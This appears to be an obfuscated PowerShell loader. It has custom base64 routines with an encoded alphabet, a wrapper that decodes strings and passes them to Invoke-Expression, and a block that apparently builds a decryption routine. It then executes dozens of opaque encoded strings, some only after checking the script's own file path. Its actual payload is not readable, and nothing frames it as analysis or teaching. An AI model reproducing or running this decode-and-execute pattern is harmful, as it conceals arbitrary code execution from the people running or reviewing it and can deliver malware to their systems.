function Do-B ([Object[]]$inStr="asdasd"){
   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AEEAQgBDAEQARQBGAEcASABJAEoASwBMAE0ATgBPAFAAUQBSAFMAVABVAFYAVwBYAFkAWgAwADEAMgAzADQANQA2ADcAOAA5ACsALwA="));
   $r = "";
   $p = "";
   $c = $inStr.Length % 3;
   If($c -gt 0 ) {;
      While($c -lt 3){;
         $p += "=";
         $inStr += 0;
         $c += 1;
      };
   };
   ;For($i=0;
         $i -lt $inStr.Length;
         $i+=3){;
      $n0 = [convert]::ToInt32($inStr[$i]);
      $n1 = [convert]::ToInt32($inStr[$i+1]);
      $n2 = [convert]::ToInt32($inStr[$i+2]);
      $n = ($n0 -shl 16) + ($n1 -shl 8) + ($n2);
      $n0 = ($n -shr 18) -band 63;
      $n1 = ($n -shr 12) -band 63;
      $n2 = ($n -shr 6) -band 63;
      $n3 = $n -band 63;
      $r += $b[$n0] + $b[$n1] + $b[$n2] + $b[$n3];
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
   $r = $r + $p;
   return $r;
}

Function Do-D([String]$inStr){;
   $p = "";
   $b = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("YQBiAGMAZABlAGYAZwBoAGkAagBrAGwAbQBuAG8AcABxAHIAcwB0AHUAdgB3AHgAeQB6AEEAQgBDAEQARQBGAEcASABJAEoASwBMAE0ATgBPAFAAUQBSAFMAVABVAFYAVwBYAFkAWgAwADEAMgAzADQANQA2ADcAOAA5ACsALwA="));
   $bi = @();
   $r = "";
   For($i = 0;
         $i -lt 256;
         $i++){;
      $bi += -1;
   };
   $enc = [system.Text.Encoding]::ASCII;
   $bb = $enc.GetBytes($b);
   For($i = 0;
         $i -lt $bb.Length;
         $i++){;
      $bi[$bb[$i]] = $i;
   };
   If($inStr[$inStr.Length-1] -eq "="){;
      $p += "A";
   };
   If($inStr[$inStr.Length-2] -eq "="){;
      $p += "A";
   };
   $inStr = $inStr.SubString(0,$inStr.Length - $p.Length) + $p;
   $inBytes = $enc.GetBytes($inStr);
   For($i=0;
         $i -lt $inBytes.Length;
         $i+=4){;
      $n0 = [convert]::ToInt32($inBytes[$i]);
      $n1 = [convert]::ToInt32($inBytes[$i+1]);
      $n2 = [convert]::ToInt32($inBytes[$i+2]);
      $n3 = [convert]::ToInt32($inBytes[$i+3]);
      $n0 = $bi[$inBytes[$i]] -shl 18;
      $n1 = $bi[$inBytes[$i+1]] -shl 12;
      $n2 = $bi[$inBytes[$i+2]] -shl 6;
      $n3 = $bi[$inBytes[$i+3]];
      $n = $n0 + $n1 + $n2 + $n3;
      $n0 = ($n -shr 16) -band 255;
      $n1 = ($n -shr 8) -band 255;
      $n2 = $n -band 255;
      $r += [convert]::ToChar($n0) + [convert]::ToChar($n1) + [convert]::ToChar($n2);
   };
   $r = $r.SubString(0,$r.Length-$p.Length);
   return $r;
}

function ds($enc, $p, $s="sc", $i="ivp") 
{ 
   if($enc -is [string]){ 
      $enc = rc "w0nVBNzLCNrDoJPgCM9TqMfZzty0u3rYAw5NkcrLBMmPia=="
   } 

   $r = rc "BMv3lu9IAMvJDcbtExn0zw0Uu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLjPAM5KywvStwfUywDLzca="
      $p2 = [Text.Encoding]::UTF8.GetBytes($p) 
      $s = [Text.Encoding]::UTF8.GetBytes($s) 

      $r.Key = rc "kg5LDY1pyMPLy3qGu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLbHC3n3B3jKrgvYAxzLqNL0zxmGjhaYlcaKCYWGiLniqteIlca1ks5hzxrcExrLCYGZmIK="
      $r.IV = rc "kg5LDY1pyMPLy3qGu2vJDxjPDhKUq3j5ChrVz3jHCgH5lLniqtfnyw5Hz2vKks5dB21WDxrLsgfZAcGGw1rLEhqUrw5JB2rPBMDDoJPvvey4lKDLDej5DgvZkcrPksaPwZaUlJe1xsa="


      $d = rc "jhiUq3jLyxrLrgvJCNLWDg9YkcK="
      $ms = rc "BMv3lu9IAMvJDcbjtY5nzw1VCNLtDhjLyw0GqcGSjgvUyYKG"
      $cs = rc "BMv3lu9IAMvJDcbtzwn1CML0Es5dCNLWDg9NCMfWAhKUq3j5ChrVu3rYzwfTicrTCYWKzcWIuMvHzciG"
      $sr = rc "BMv3lu9IAMvJDcbjtY5tDhjLyw1szwfKzxiGjgnZia=="
      rc "v3jPDguTt3v0Chv0icrZCI5szwfKvg9fBMqOkq=="
      rc "jhnYlKnSB3nLkcK="
      rc "jgnZlKnSB3nLkcK="
      rc "jg1ZlKnSB3nLkcK="
      rc "jhiUq2XLyxiOkq=="
} 

function rc([String]$inStr)
{
   return iex(Do-D($inStr))
}


rc "u2v0lvzHCMLHyMXLic1oyw1Licj4iIaTvMfSDwuGkhjJicjYmNyWBhzUsKfNDKTeD1HmEMzYsemYu0DSDNjiqZjuB3L3muXPy2P3ENHQuhPnteP5EhjqqJi1DhP4AJjbD25mAuC9psiPic1ty29WzsbNBg9IywW="
rc "u2v0lvzHCMLHyMXLic1oyw1LicjHiIaTvMfSDwuGkhjJicjQAeDvCxDUmef3ovvdwtvIq01emuj3DLveAg09iIKGlvnJB3bLigDSB2jHBa=="

rc "u2v0lvzHCMLHyMXLic1oyw1LicjHiIaTvMfSDwuGkhjJicjQz2vhBhHQtenNweH5mNvhAuKXz0f3weXPy2LtAwnPssiPic1ty29WzsbNBg9IywW="

$p = $MyInvocation.MyCommand.Path

$g = $a -eq $p

If($g)
{
   rc "u2v0lvzHCMLHyMXLic1oyw1LicjJiIaTvMfSDwuGkhjJicjYmNyWBhzevef1ouLbtxzkrgnHvhrnzLr6Eg5xExDUtgLJALLcmJKWEgHUmxLoBKPdtuXxrgDmvKjjAuDSDw5tExHUwMLJrgrcmJfuExC1s3rNtfv6DxyYENC1mheYovvdm3zuENHPtIiPic1ty29WzsbNBg9IywW="
      rc "u2v0lvzHCMLHyMXLic1oyw1LicjJBciGlvzHBhvLicHYyYaIDZnUmenntfv6mtblEvK1zeiYmvr5DZvlDgDmvxP2CKXcEgjtExHYtciPic1ty29WzsbNBg9IywW="
      rc "u2v0lvzHCMLHyMXLic1oyw1LicjJBhmIic1wywX1zsaOCMmGiMPNBLnStg4XEuXUmenntfv6wuCXB3ntmMTXpt0IksaTu2nVCguGz2XVyMfS"
      rc "u2v0lvzHCMLHyMXLic1oyw1LicjKiIaTvMfSDwuGkhjJicjYzZHuCMnHsun2uhfXmhi0EuTunuvOAM1cztvjD00Xwhb0meKIksaTu2nVCguGz2XVyMfS"
      If($cls -eq $d)
      {
         rc "u2v0lvzHCMLHyMXLic1Uyw1LicjTiIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrStg5mEtn2wuf4CJvSs25zrxHImeiYrfL5Egjprxm1BNjKDMrdtKXxrgC5DhP4AJjbD25mDwHQvKrnteT6EgK9iIKGlvnJB3bLigDSB2jHBa=="
            rc "u2v0lvzHCMLHyMXLic1Uyw1Licj1iIaTvMfSDwuGkhjJicjctxyZBhC5sufnDKPey2fuDMHmv3P1nuHcD3vhDtnmwKrNDLrSthjmrwHXvxz2CMDVzxzvEti5s0f3nu4IksaTu2nVCguGz2XVyMfS"
            rc "u2v0lvzHCMLHyMXLic1Uyw1LicjOiIaTvMfSDwuGkhjJicj3mw41qZnYtejZnwnbEhjKqJi1mNP4AJb6EgPeB0PqDuiXBJbdtuXvELLhs0jZnwrcmJfxrhHYthnNzLPby0Dlrhm1AhP4CMnfEhjmq1Lhs3KYwfPRC0TqiIKGlvnJB3bLigDSB2jHBa=="
            rc "u2v0lvzHCMLHyMXLic1oyw1LicjKyxqIic1wywX1zsaOiJH6CfzsqvDdA3LNAuqVA0G4DJKXELe9psiPic1ty29WzsbNBg9IywW="
            rc "u2v0lvzHCMLHyMXLic1oyw1LicjWyxj0mYiGlvzHBhvLicHKCYaKzgf0icrOksaTu2nVCguGz2XVyMfS"
      }

}
